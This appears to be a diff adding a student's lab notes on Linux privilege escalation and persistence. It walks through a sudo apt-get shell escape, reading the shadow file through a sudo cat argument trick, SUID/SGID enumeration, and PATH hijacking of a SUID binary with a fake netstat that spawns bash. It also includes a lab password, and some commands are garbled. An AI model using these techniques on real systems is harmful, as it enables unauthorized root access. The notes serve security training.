@@ -1002,6 +1002,112 @@ ssh> 8888:192.168.28.9:3389
 student@lin-ops:~$ xfreerdp /v:localhost:8888 /u:comrade /p:StudentMidwayPassword /size:1920x1000 +clipboard
 
 
+_____Linux Exploitation_____
+
+Privilege Escalation, Persistence & Covering Your Tracks
+
+Objectives
+Establish and maintain Linux persistence by:
+    Adding or hijacking a user account
+    Implementing boot process persistence
+    Adding or modifying a CRON job
+    Adding a kernel module (with a backdoor)
+    Additional methods outside the scope of the SG
+
+Discuss
+    What is privilege escalation?
+	Gaining additional or alternative permissions on a target
+    What privs do I want, and why?
+    What are some considerations of privilege escalation?
+    If I obtained privs as user "bob," then I can obtain privs for user "jane," is that escalation?
+
+Enumerating For Privilege Escalation
+
+    What are the techniques and processes?
+        Is there any particular order?
+		easiest to hardest relative to the options you have
+        Is there anything else you should be doing while on the box?
+
+sudo
+one command at a time
+default answer for priv esc, built in and easy
+sudo -l - list the things that sudo can do
+GTFO Bins
+
+student@lin-ops:~$ ssh student@10.50.30.154 -L 31200:10.10.28.42:22
+student@lin-ops:~$ ssh demo1@localhost -p 31200
+demo1@linux-priv-16:~$ sudo -l
+[sudo] password for demo1: 
+Matching Defaults entries for demo1 on linux-priv-16:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+User demo1 may run the following commands on linux-priv-16:
+    (root) /usr/bin/apt-get
+from GTFO Bins
+sudo apt-get changelog apt
+!/bin/sh
+now you should have root (#)
+
+if you had /bin/cat var/log/syslog*
+run
+cat /var/log/syslog/ /cat/shadow
+(need a second arguement after syslog)
+
+
+SUID/SGID
+
+    What is SUID/SGID?
+	SUID - sticky bits
+	ls -la /bin
+	ping (in red)
+	needs root priv
+	sticky bit causes ping to maintain owners priv
+	this means that ping does not have a vulnerability
+    Why should you consider it for privilege escalation?
+    	
+    What commands should you run?
+	The find command is likely the best tool for finding binaries that are SGID or SUID:
+	find / -type f -perm /4000 -ls 2>/dev/null # Find SUID only files
+	find / -type f -perm /2000 -ls 2>/dev/null # Find SGID only files
+	find / -type f -perm /6000 -ls 2>/dev/null # Find SUID and/or SGID files
+
+/bin/natstat_natup
+$netstat -natpu
+the natpu are the flags
+PIDs dont show up because we're not root
+$netstat_natpu (runs netstat as cpompiler)
+runs as root, we can see PIDs
+
+$strings /bin/netstat_natpu | grep "setuid"
+Not setuid root.
+_setuid
+$strings /bin/netstat_natpu | grep "netstat"
+netstat -antpu
+$which netstat
+/bin/netstat (this is the path variable)
+$echo -e '#!/bin/sh\n/bin/bash -i' > /home/demo2/netstat
+$cd ~
+$chmod +x netstat
+$PATH =.:$PATH
+$echo $PATH
+.:/usr/local/sbin:/usr/local/bin:...
+the prepended . makes the system first look in the current directory
+$netstat_natpu
+this forces the system to run netstat_natpu in the current directory which is now a bash shell in the current directory
+now we are root
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
